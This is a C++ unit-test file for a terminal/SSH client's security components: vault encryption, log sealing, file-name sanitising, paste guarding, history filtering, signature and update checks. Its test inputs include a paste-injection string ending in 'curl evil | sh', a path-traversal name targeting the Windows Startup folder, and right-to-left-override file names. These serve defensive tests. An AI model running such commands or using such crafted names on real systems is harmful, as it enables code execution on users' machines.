// Unit tests: no network, no servers. Every security-relevant parser and
// crypto building block, including the negative cases. Run: ./unit_tests
#include "app/UpdateChecker.h"
#include "core/ActivityLog.h"
#include "core/CommandHistory.h"
#include "core/FileNames.h"
#include "core/KnownHosts.h"
#include "core/Minisign.h"
#include "core/Protected.h"
#include "core/Shadowsocks.h"
#include "core/Vault.h"
#include "core/SafeText.h"
#include "core/BackgroundThreads.h"
#include "core/ProxyTunnel.h"
#include "terminal/PasteGuard.h"

#include "blake3.h"

#include <QCoreApplication>
#include <QDir>
#include <QFile>
#include <QJsonArray>
#include <QJsonDocument>
#include <QJsonObject>
#include <QTemporaryDir>
#include <QElapsedTimer>
#include <atomic>
#include <thread>

#include <cstdio>
#include <sodium.h>

static int g_fail = 0;
#define CHECK(cond, msg) do { if (cond) std::printf("  ok   %s\n", msg); else { std::printf("  FAIL %s\n", msg); ++g_fail; } } while (0)

static QByteArray readFile(const QString &p) { QFile f(p); f.open(QIODevice::ReadOnly); return f.readAll(); }
static void writeFile(const QString &p, const QByteArray &d) { QFile f(p); f.open(QIODevice::WriteOnly); f.write(d); }

static void testVault(const QString &dir)
{
    std::printf("[vault]\n");
    const QString path = dir + "/v.swv";
    QString err;
    {
        Vault v(path);
        CHECK(!v.create("short", &err), "refuses a master password under 8 characters");
        CHECK(v.create("correct horse battery", &err), "creates a vault");
        v.data().insert("hosts", QJsonArray{QJsonObject{{"password", "s3cret!"}}});
        CHECK(v.save(&err), "saves");
        CHECK(v.save(&err) && QFile::exists(path + ".bak"), "keeps the previous version as .bak");
    }
    CHECK(!readFile(path).contains("s3cret!"), "file does not contain the secret in the clear");
    {
        Vault v(path);
        CHECK(!v.unlock("wrong password!", &err), "wrong password is refused");
        CHECK(v.unlock("correct horse battery", &err), "right password opens it");
        CHECK(v.data().value("hosts").toArray().at(0).toObject().value("password").toString() == "s3cret!", "data round-trips");
        QByteArray out(32, 0);
        QString e2;
        CHECK(v.deriveWithVaultCost("correct horse battery", QByteArray(16, 'x'), reinterpret_cast<unsigned char *>(out.data()), &e2)
                  && out != QByteArray(32, 0), "derives an extra key with the vault's cost");
    }
    {   // changing the master password
        Vault v(path);
        CHECK(v.unlock("correct horse battery", &err), "opens for the password change");
        CHECK(!v.changePassword("wrong password!", "new password 42", &err) && err == "Wrong master password.",
              "a wrong current password is refused");
        CHECK(v.isUnlocked() && v.data().value("hosts").toArray().size() == 1,
              "after a refused change the vault stays open with its data");
        CHECK(v.save(&err), "and still saves");
        // the file is briefly unreadable (antivirus, cloud sync): nothing is lost
        QFile::rename(path, path + ".away");
        CHECK(!v.changePassword("wrong password!", "new password 42", &err) && v.isUnlocked()
                  && v.data().value("hosts").toArray().size() == 1,
              "a refused change with the file missing keeps the vault open");
        // the file cannot be written: the old password stays in force
        QDir().mkpath(path);   // a folder where the file should be
        CHECK(!v.changePassword("correct horse battery", "new password 42", &err), "a change that cannot be written fails");
        QDir().rmdir(path);
        QFile::rename(path + ".away", path);
        CHECK(v.isUnlocked() && v.verifyPassword("correct horse battery") && !v.verifyPassword("new password 42"),
              "after a failed write the old password is still the one in use");
        CHECK(v.save(&err), "saves again with the old password");
        CHECK(v.changePassword("correct horse battery", "new password 42", &err), "a real change works");
        Vault again(path);
        CHECK(!again.unlock("correct horse battery", &err) && again.unlock("new password 42", &err)
                  && again.data().value("hosts").toArray().size() == 1,
              "the file opens with the new password only, data kept");
        CHECK(again.changePassword("new password 42", "correct horse battery", &err), "and back");
    }
    {   // every byte of header and ciphertext is authenticated
        QByteArray raw = readFile(path);
        QByteArray t = raw; t[t.size() - 5] = char(t[t.size() - 5] ^ 1);
        writeFile(dir + "/t1.swv", t);
        Vault v(dir + "/t1.swv");
        CHECK(!v.unlock("correct horse battery", &err), "a flipped ciphertext bit is detected");
        // forged KDF parameters: memlimit 4 GiB (bytes 16..23, little-endian)
        QByteArray f = raw;
        const quint64 huge = 4ull << 30;
        for (int i = 0; i < 8; ++i) f[16 + i] = char((huge >> (8 * i)) & 0xff);
        writeFile(dir + "/t2.swv", f);
        Vault v2(dir + "/t2.swv");
        CHECK(!v2.unlock("correct horse battery", &err), "a forged memory limit (4 GiB) is refused before deriving");
        writeFile(dir + "/t3.swv", raw.left(40));
        Vault v3(dir + "/t3.swv");
        CHECK(!v3.unlock("correct horse battery", &err), "a truncated file is refused");
    }
}

static void testProtected()
{
    std::printf("[protected secrets]\n");
    unsigned char seed[32], sk[32], sk2[32];
    randombytes_buf(seed, sizeof seed);
    QByteArray pk, pk2;
    protect::keypairFromSeed(seed, &pk, sk);
    protect::keypairFromSeed(seed, &pk2, sk2);
    CHECK(pk == pk2 && sodium_memcmp(sk, sk2, 32) == 0, "the same seed gives the same key pair");
    const QByteArray box = protect::seal("server password", pk);
    QByteArray plain;
    CHECK(!box.isEmpty() && protect::open(box, pk, sk, &plain) && plain == "server password", "seal + open round-trips");
    unsigned char other[32]; QByteArray opk; unsigned char seed2[32]; randombytes_buf(seed2, 32);
    protect::keypairFromSeed(seed2, &opk, other);
    CHECK(!protect::open(box, opk, other, &plain), "another key pair cannot open it");
    QByteArray changed = QByteArray::fromBase64(box); changed[changed.size() - 1] = char(changed.back() ^ 1);
    CHECK(!protect::open(changed.toBase64(), pk, sk, &plain), "a changed box is refused");
}

static void testJournal(const QString &dir)
{
    std::printf("[journal]\n");
    const QString logs = dir + "/logs";
    QDir().mkpath(logs);
    // a plain journal of an older version
    const QString month = QDate::currentDate().toString("yyyy-MM");
    writeFile(logs + "/activity-" + month + ".jsonl",
              QJsonDocument(QJsonObject{{"t", QDateTime::currentDateTime().toString(Qt::ISODateWithMs)}, {"l", "info"},
                                        {"c", "session"}, {"m", "Connected"}, {"h", "old-plain-host.example"}}).toJson(QJsonDocument::Compact) + "\n");
    QByteArray pk(crypto_box_PUBLICKEYBYTES, 0), sk(crypto_box_SECRETKEYBYTES, 0);
    crypto_box_keypair(reinterpret_cast<unsigned char *>(pk.data()), reinterpret_cast<unsigned char *>(sk.data()));
    {
        ActivityLog log(logs);
        log.setRetentionDays(30);
        log.add(ActivityLog::Info, "app", "started before the vault exists");   // waits in memory
        CHECK(log.open(pk, sk).isEmpty(), "opens with the vault's key pair");
        CHECK(!QFile::exists(logs + "/activity-" + month + ".jsonl"), "the old plain file is gone");
        log.add(ActivityLog::Security, "session", "Connected", "via proxy", "secret-host.example");
        CHECK(log.count() == 3, "old entry, waiting entry and new entry are readable while open");
        log.close();
        CHECK(log.count() == 0 && !log.readable(), "nothing readable after close");
        log.add(ActivityLog::Warning, "vault", "Failed unlock attempt", {}, "locked-host.example");   // written while locked
    }
    const QByteArray disk = readFile(logs + "/activity-" + month + ".swlog");
    CHECK(!disk.isEmpty() && !disk.contains("host.example") && !disk.contains("Connected"), "nothing on disk is in the clear");
    {
        ActivityLog log(logs);
        log.setRetentionDays(30);
        log.open(pk, sk);
        CHECK(log.count() == 4, "an entry written while locked is readable after opening");
        QByteArray wrong(crypto_box_SECRETKEYBYTES, 0);
        CHECK(ActivityLog::openLine(disk.split('\n').first(), pk, reinterpret_cast<const unsigned char *>(wrong.constData())).isEmpty(),
              "a wrong secret key reads nothing");
    }
    {   // retention: an entry from 40 days ago in the current month's file goes when 30 days are kept
        const QDateTime old = QDateTime::currentDateTime().addDays(-40);
        const QString f = logs + "/activity-" + old.date().toString("yyyy-MM") + ".swlog";
        QFile out(f); out.open(QIODevice::Append);
        out.write(ActivityLog::sealLine(QJsonDocument(QJsonObject{{"t", old.toString(Qt::ISODateWithMs)}, {"l", "info"},
                                                                  {"c", "x"}, {"m", "old"}}).toJson(QJsonDocument::Compact), pk) + "\n");
        out.close();
        ActivityLog log(logs);
        log.setRetentionDays(30);
        log.open(pk, sk);
        bool hasOld = false;
        for (int i = 0; i < log.count(); ++i)
            hasOld = hasOld || log.data(log.index(i), ActivityLog::MessageRole).toString() == "old";
        CHECK(!hasOld, "entries older than the retention are dropped");
    }
}

static void testFileNames()
{
    std::printf("[file names from servers]\n");
    using filenames::safeLocal;
    CHECK(safeLocal("report.pdf") == "report.pdf", "a normal name stays");
    CHECK(!safeLocal("..\\..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\x.bat").contains('\\'),
          "backslashes (a Windows path out of the folder) are removed");
    CHECK(safeLocal("..") != ".." && safeLocal(".") != "." && !safeLocal("").isEmpty(), "\"..\", \".\" and \"\" never stay");
    CHECK(safeLocal("a:b") == "a_b" && safeLocal("x<y>z|?*\"") == "x_y_z____", "characters Windows forbids are replaced");
    CHECK(safeLocal("evil.bat.") == "evil.bat" && safeLocal("evil.bat  ") == "evil.bat", "trailing dots and spaces are dropped");
    CHECK(safeLocal("CON") == "_CON" && safeLocal("nul.txt") == "_nul.txt" && safeLocal("com1") == "_com1", "reserved device names get a prefix");
    CHECK(!safeLocal(QString("a") + QChar(0x1b) + "[31m").contains(QChar(0x1b)), "control characters are replaced");
    CHECK(!safeLocal(QString("photo") + QChar(0x202e) + "gpj.exe").contains(QChar(0x202e)), "right-to-left override is replaced");
    CHECK(safeLocal(QString(300, 'a') + ".txt").size() <= 200 && safeLocal(QString(300, 'a') + ".txt").endsWith(".txt"),
          "very long names are cut, the extension stays");
}

static void testPaste()
{
    std::printf("[paste]\n");
    const QString web = QString("echo one") + QChar(0x1b) + "[201~ && curl evil | sh\n";
    CHECK(!pasteguard::clean(web).contains(QChar(0x1b)), "ESC is removed (no early end of bracketed paste)");
    CHECK(pasteguard::clean("a\r\nb\nc") == "a\rb\rc", "line breaks become CR");
    CHECK(pasteguard::clean(QString("x") + QChar(0x9b) + "y") == "xy", "C1 controls (8-bit CSI) are removed");
    CHECK(pasteguard::clean("tab\there") == "tab\there", "tabs stay");
    CHECK(!pasteguard::needsConfirm(pasteguard::clean("ls -la")), "one line: no question");
    CHECK(pasteguard::needsConfirm(pasteguard::clean("ls\n")), "a trailing line break runs it: asked");
    CHECK(pasteguard::needsConfirm(QString(6000, 'a')), "very long text: asked");
    CHECK(pasteguard::lineCount(pasteguard::clean("a\nb\nc\n")) == 3, "counts lines");
}

static void testHistory()
{
    std::printf("[command history]\n");
    using history::commandFromLine;
    CHECK(commandFromLine("user@host:~$ ls -la") == "ls -la", "bash prompt");
    CHECK(commandFromLine("[root@h ~]# systemctl restart nginx") == "systemctl restart nginx", "root prompt");
    CHECK(commandFromLine("PS C:\\Users\\me> Get-Process") == "Get-Process", "PowerShell prompt");
    CHECK(commandFromLine("user@host:~$  secret-command").isEmpty(), "a leading space means: do not remember");
    CHECK(commandFromLine("mysql> ALTER USER 'a'@'%' IDENTIFIED BY 'pw';").isEmpty(), "mysql> is not remembered");
    CHECK(commandFromLine("MariaDB [(none)]> select 1;").isEmpty(), "MariaDB prompt is not remembered");
    CHECK(commandFromLine("postgres=# \\password").isEmpty(), "psql superuser prompt is not remembered");
    CHECK(commandFromLine("app=> select 1;").isEmpty(), "psql user prompt is not remembered");
    CHECK(commandFromLine(">>> import os").isEmpty(), "python prompt is not remembered");
    CHECK(commandFromLine("Password:").isEmpty(), "a password prompt is not a command");
    CHECK(commandFromLine("user@host:~$ mysql -uroot -pS3cret").isEmpty(), "mysql -p<password> is not remembered");
    CHECK(commandFromLine("user@host:~$ export API_TOKEN=abc").isEmpty(), "tokens are not remembered");
    CHECK(commandFromLine("user@host:~$ git clone https://u:p@example.com/r.git").isEmpty(), "URLs with a password are not remembered");
    CHECK(commandFromLine("user@host:~$ curl -u admin:x https://h").isEmpty(), "curl -u is not remembered");
    CHECK(commandFromLine("Router(config)# username admin password 0 x").isEmpty(), "network device passwords are not remembered");
    CHECK(commandFromLine("user@host:~$ git status") == "git status", "ordinary commands are remembered");
}

static void testKnownHosts(const QString &dir)
{
    std::printf("[known_hosts]\n");
    const QString kh = dir + "/known_hosts";
    writeFile(kh, "# comment\n"
                  "example.com,10.0.0.5 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl\n"
                  "[lab.local]:2222 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl\n"
                  "*.corp.example ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl\n");
    CHECK(knownhosts::hashFile(kh) == 3, "three names hashed (two from one line)");
    const QByteArray text = readFile(kh);
    CHECK(!text.contains("example.com,") && !text.contains("lab.local") && !text.contains("10.0.0.5"), "no host name left in the clear");
    CHECK(text.contains("*.corp.example") && text.contains("# comment"), "wildcard patterns and comments are kept");
    int hits = 0;
    for (const auto &e : knownhosts::load(kh)) {
        hits += knownhosts::matches(e.hosts, "example.com", 22);
        hits += knownhosts::matches(e.hosts, "lab.local", 2222);
    }
    CHECK(hits == 2, "hashed entries still match their host and port");
    CHECK(knownhosts::hashFile(kh) == 0, "hashing again changes nothing");
    CHECK(knownhosts::removeHost(kh, "lab.local", 2222) == 1, "a hashed entry can be removed by host");
}

static void testMinisign()
{
    std::printf("[minisign]\n");
    // test-only key pair (generated for these tests; not the release key)
    const QString pub = "RWSSkHbWDMD2/E/lBsrPfDbBhXxI5Kw9zo4ELaOiJp1LwupraYGhvEfu";
    const QByteArray data = "abc123  ShellWarden-9.9.9-setup.exe\n";
    const QByteArray sig = "untrusted comment: signature from minisign secret key\n"
                           "RUSSkHbWDMD2/J8ygEtF2Jag6KolCOYMwGN8Ertql7VVTiRWAvGUHDhlKqkw0AeWtCKBQG0HFrSkPp8nOws31DZ+BFcWeg6VwwY=\n"
                           "trusted comment: ShellWarden 9.9.9 2026-01-01\n"
                           "kaH0AU6/dG6qAK8pfEMgUQWxAhDSxGTYDk2DXbp2US5qP1XEMKg3EveTOJviz1ALDlzv9iEPHb1jsgc3VDf3AQ==\n";
    QString err, tc;
    CHECK(minisign::verify(data, sig, pub, &err, &tc) && tc == "ShellWarden 9.9.9 2026-01-01", "a good signature and its comment");
    QByteArray d2 = data; d2[0] = 'b';
    CHECK(!minisign::verify(d2, sig, pub, &err), "a changed file is refused");
    QByteArray s2 = sig; s2.replace("9.9.9", "9.9.8");
    CHECK(!minisign::verify(data, s2, pub, &err), "a changed trusted comment is refused");
    CHECK(!minisign::verify(data, sig, "RWQf6LRCGA9i53mlYecO4IzT51TGPpvWucNSCh1CBM0QTaLn73Y7GFO3", &err), "another public key is refused");
    CHECK(!minisign::verify(data, "garbage", pub, &err), "a broken signature file is refused");
}

static void testUpdates()
{
    std::printf("[updates]\n");
    const QString cur = "0.3.3";
    CHECK(UpdateChecker::releaseProblem("v0.3.4", "ShellWarden-0.3.4-setup.exe", "ShellWarden 0.3.4 2026-11-08", true, cur).isEmpty(),
          "a newer, consistent release is accepted");
    CHECK(!UpdateChecker::releaseProblem("v0.3.3", "ShellWarden-0.3.3-setup.exe", "ShellWarden 0.3.3 2026-11-07", true, cur).isEmpty(),
          "the same version is not installed again");
    CHECK(!UpdateChecker::releaseProblem("v9.0.0", "ShellWarden-9.0.0-setup.exe", "ShellWarden 0.3.0 2026-11-07", true, cur).isEmpty(),
          "an old signed release under a new tag is refused (downgrade)");
    CHECK(!UpdateChecker::releaseProblem("v9.0.0", "ShellWarden-0.3.0-setup.exe", "ShellWarden 9.0.0 2026-11-07", true, cur).isEmpty(),
          "a file of another version is refused");
    CHECK(!UpdateChecker::releaseProblem("v9.0.0", "ShellWarden-9.0.0-setup.exe", "", true, cur).isEmpty(),
          "a signature without a version is refused");
    CHECK(!UpdateChecker::releaseProblem("latest", "ShellWarden-latest-setup.exe", "", false, cur).isEmpty(), "a tag that is not a version is refused");
    const QByteArray sums = "1111111111111111111111111111111111111111111111111111111111111111  ShellWarden-1.0.0-setup.exe\n"
                            "2222222222222222222222222222222222222222222222222222222222222222 *ShellWarden-1.0.0-portable.zip\n";
    CHECK(UpdateChecker::checksumFor(sums, "ShellWarden-1.0.0-setup.exe") == QString(64, '1'), "checksum for the exact file name");
    CHECK(UpdateChecker::checksumFor(sums, "ShellWarden-1.0.0-portable.zip") == QString(64, '2'), "binary-mode marker handled");
    CHECK(UpdateChecker::checksumFor(sums, "ShellWarden-1.0.0.AppImage").isEmpty(), "no line, no checksum");
    CHECK(UpdateChecker::checksumFor(QByteArray(64, '3'), "ShellWarden-1.0.0-setup.exe").isEmpty(), "a bare hash without a file name is not used");
    CHECK(UpdateChecker::checksumFor(sums + "3333333333333333333333333333333333333333333333333333333333333333  ShellWarden-1.0.0-setup.exe\n",
                                     "ShellWarden-1.0.0-setup.exe").isEmpty(), "two different sums for one file: refused");
    CHECK(UpdateChecker::compareVersions("0.10.0", "0.9.9") > 0 && UpdateChecker::compareVersions("v1.2", "1.2.0") == 0, "version comparison");
    const QString notes = UpdateChecker::safeNotes("- fix ![x](http://evil/p.png) <img src=\"\\\\evil\\s\\x.png\"> **ok**");
    CHECK(!notes.contains("evil") && notes.contains("**ok**"), "images and HTML are removed from release notes");
    CHECK(UpdateChecker::pickNotes("<!-- lang:en -->\nhello\n<!-- lang:uk -->\nпривіт", "uk") == "привіт", "release notes in the app language");
}

static void testShadowsocks()
{
    std::printf("[shadowsocks]\n");
    CHECK(shadowsocks::masterKey("foobar", 32).toHex() == "3858f62230ac3c915f300c664312c63f568378529614d22ddb49237d2f60bfdf",
          "EVP_BytesToKey (reference value)");
    CHECK(shadowsocks::hkdfSha1(QByteArray::fromHex("0b0b0b0b0b0b0b0b0b0b0b"), QByteArray::fromHex("000102030405060708090a0b0c"),
                                QByteArray::fromHex("f0f1f2f3f4f5f6f7f8f9"), 42).toHex()
              == "085a01ea1b10f36933068b56efa5ad81a4f14b822f5b091568a9cdd4f155fda2c22e422478d305f3f896", "HKDF-SHA1 (RFC 5869 case 4)");
    // BLAKE3 official test vectors (input = 0,1,2,…,250,0,1,… ; derive_key context below)
    auto b3input = [](int n) { QByteArray b(n, 0); for (int i = 0; i < n; ++i) b[i] = char(i % 251); return b; };
    auto b3derive = [](const QByteArray &in) {
        blake3_hasher h; blake3_hasher_init_derive_key(&h, "BLAKE3 2019-12-27 16:29:52 test vectors context");
        blake3_hasher_update(&h, in.constData(), size_t(in.size()));
        QByteArray out(32, 0); blake3_hasher_finalize(&h, reinterpret_cast<uint8_t *>(out.data()), 32); return out.toHex();
    };
    auto b3hash = [](const QByteArray &in) {
        blake3_hasher h; blake3_hasher_init(&h); blake3_hasher_update(&h, in.constData(), size_t(in.size()));
        QByteArray out(32, 0); blake3_hasher_finalize(&h, reinterpret_cast<uint8_t *>(out.data()), 32); return out.toHex();
    };
    CHECK(b3derive(b3input(0)) == "2cc39783c223154fea8dfb7c1b1660f2ac2dcbd1c1de8277b0b0dd39b7e50d7d"
              && b3derive(b3input(1025)) == "effaa245f065fbf82ac186839a249707c3bddf6d3fdda22d1b95a3c970379bcb",
          "BLAKE3 derive_key test vectors");
    CHECK(b3hash(b3input(64)) == "4eed7141ea4a5cd4b788606bd23f46e212af9cacebacdc7d1f4c6dc7f2511b98"
              && b3hash(b3input(1024)) == "42214739f095a406f3fc83deb889744ac00df831c10daa55189b5d121c855af7",
          "BLAKE3 hash test vectors");
    auto l = shadowsocks::parseLink("ss://Y2hhY2hhMjAtaWV0Zi1wb2x5MTMwNTpUZXN0LVNTLVBhc3MtMQ@127.0.0.1:8388#Lab%20SS");
    CHECK(l.ok && l.method == "chacha20-ietf-poly1305" && l.password == "Test-SS-Pass-1" && l.port == 8388 && l.name == "Lab SS", "SIP002 link");
    l = shadowsocks::parseLink("ss://2022-blake3-aes-256-gcm:c3dTZXN0S2V5LTMyLWJ5dGVzLWFlczI1Ni0wMDAwMDA%3D@[2001:db8::1]:443");
    CHECK(l.ok && l.method == "2022-blake3-aes-256-gcm" && l.password.endsWith('=') && l.host == "2001:db8::1", "Shadowsocks 2022 link, IPv6");
    l = shadowsocks::parseLink("ss://YWVzLTI1Ni1nY206cGFzc0BleGFtcGxlLmNvbTo4Mzg4");
    CHECK(l.ok && l.method == "aes-256-gcm" && l.host == "example.com", "old base64 link");
    CHECK(!shadowsocks::parseLink("ss://YWVzLTI1Ni1nY206cA@h:1?plugin=v2ray-plugin%3Bmode").ok, "links with a plugin are refused");
    CHECK(!shadowsocks::parseLink("ss://cmM0LW1kNTpw@h:1").ok, "an unsupported cipher (rc4-md5) is refused");
    CHECK(!shadowsocks::keyProblem("2022-blake3-aes-256-gcm", "short").isEmpty(), "2022: a password is not a key");
    CHECK(shadowsocks::keyProblem("2022-blake3-aes-128-gcm", "c3dUZXN0S2V5LWFlczEyOA==").isEmpty(), "2022: a 16-byte key for aes-128");
    CHECK(!shadowsocks::keyProblem("2022-blake3-aes-128-gcm", "c3dUZXN0S2V5LTMyLWJ5dGVzLWNoYWNoYTIwLTAwMDA=").isEmpty(), "2022: wrong key length");
    CHECK(!shadowsocks::keyProblem("2022-blake3-chacha20-poly1305", "c3dUZXN0S2V5LTMyLWJ5dGVzLWNoYWNoYTIwLTAwMDA=:c3dUZXN0S2V5LTMyLWJ5dGVzLWNoYWNoYTIwLTAwMDA=").isEmpty(),
          "2022: chacha has no identity headers");
}

static void testSafeText()
{
    std::printf("[text from the other side]\n");
    using safetext::snippet;
    CHECK(snippet(QByteArray("HTTP/1.1 403 Forbidden")) == "HTTP/1.1 403 Forbidden", "ordinary text unchanged");
    const QString html = snippet(QByteArray("HTTP/1.1 502 <b>x</b><img src='file://evil/s/x.png'>"));
    CHECK(!html.contains('<') && !html.contains('>'), "angle brackets are neutralised");
    CHECK(snippet(QByteArray(16000, 'A'), 64).size() == 65, "cut to the limit (plus …)");
    CHECK(snippet(QString::fromUtf8("a\r\n\t\x1b[31mb")) == QString::fromUtf8("a [31mb"), "control characters become one space");
    CHECK(snippet(QString::fromUtf8("abc\u202Edef\u200B")) == "abcdef", "bidi and invisible characters removed");
    CHECK(snippet(QString::fromUtf8("сервер: помилка 🔒")) == QString::fromUtf8("сервер: помилка 🔒"), "non-Latin text and emoji kept");
    CHECK(snippet(QByteArray()).isEmpty() && snippet(static_cast<const char *>(nullptr)).isEmpty(), "empty and null");
}

// last: shutdown() is once per program
static void testBackgroundThreads()
{
    std::printf("[background threads stop on exit]\n");
    proxytunnel::initSockets();
    sw_socket_t a = kInvalidSocket, b = kInvalidSocket, c = kInvalidSocket, d = kInvalidSocket;
    QString err;
    CHECK(proxytunnel::loopbackPair(&a, &b, &err) && proxytunnel::loopbackPair(&c, &d, &err), "socket pairs");
    std::atomic<int> left{0};
    // like the relays: waits on a socket in short steps and looks at stopping()
    CHECK(bgthreads::start([&left, b] {
              char x;
              while (!bgthreads::stopping())
                  if (proxytunnel::readSome(b, &x, 1, 500) < 0)
                      break;
              ++left;
          }),
          "a worker waiting on a socket starts");
    bgthreads::watch(static_cast<long long>(b));
#ifndef _WIN32
    // Linux: cutting the socket wakes even a long wait at once
    CHECK(bgthreads::start([&left, d] {
              char x;
              proxytunnel::readSome(d, &x, 1, 600000);
              ++left;
          }),
          "a worker in a long wait starts");
    bgthreads::watch(static_cast<long long>(d));
    const int workers = 3;
#else
    const int workers = 2;
#endif
    CHECK(bgthreads::start([&left] {
              while (!bgthreads::stopping())
                  std::this_thread::sleep_for(std::chrono::milliseconds(20));
              ++left;
          }),
          "a looping worker starts");
    std::this_thread::sleep_for(std::chrono::milliseconds(100));
    CHECK(bgthreads::running() == workers, "all are running");
    QElapsedTimer t;
    t.start();
    const int still = bgthreads::shutdown(3000);
    CHECK(still == 0 && left == workers, qPrintable(QStringLiteral("shutdown() stops them all (%1 left)").arg(still)));
    CHECK(t.elapsed() < 2000, qPrintable(QStringLiteral("quickly (%1 ms)").arg(t.elapsed())));
    CHECK(!bgthreads::start([] {}), "no new workers after shutdown");
    for (sw_socket_t s : {a, b, c, d})
        proxytunnel::closeSocket(s);
}

int main(int argc, char **argv)
{
    QCoreApplication app(argc, argv);
    if (sodium_init() < 0) {
        std::printf("libsodium could not start\n");
        return 2;
    }
    QTemporaryDir tmp;
    testVault(tmp.path());
    testProtected();
    testSafeText();
    testJournal(tmp.path());
    testFileNames();
    testPaste();
    testHistory();
    testKnownHosts(tmp.path());
    testMinisign();
    testUpdates();
    testShadowsocks();
    testBackgroundThreads();
    std::printf("\n%s (%d failures)\n", g_fail ? "FAILED" : "ALL PASSED", g_fail);
    return g_fail ? 1 : 0;
}
